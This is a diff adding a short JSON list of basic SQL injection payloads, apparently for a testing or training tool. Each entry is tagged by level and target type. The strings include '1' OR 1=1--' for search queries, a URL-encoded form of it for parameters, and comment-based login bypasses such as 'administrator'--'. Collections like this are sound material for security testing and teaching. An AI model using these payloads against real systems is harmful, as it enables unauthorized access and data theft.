@@ -1,0 +1,36 @@
+[
+  {
+    "Level": "Low",
+    "type": "Search",
+    "num" : "1",
+    "payload": {
+        "1": "1' OR 1=1--"
+    },
+    "Explanation":  "For a search bar that uses Select * From and then WHERE to search for products",
+    "Severity": "High"
+  },
+  {
+    "Level": "Low",
+    "type": "Param",
+    "num" : "1",
+    "payload": {
+        "1": "1'+OR+1=1--"
+    },
+    "Explanation":  "For a search bar that uses Select * From and then WHERE to search for products"
+  },
+  {
+
+    "Level": "Low",
+    "type": "Login",
+    "num": "3",
+    "payload": {
+            "1" : "administrator'--",
+            "2" : "admin'--",
+            "3" : "root'--"
+    }
+  },
+  {
+
+  }
+
+]
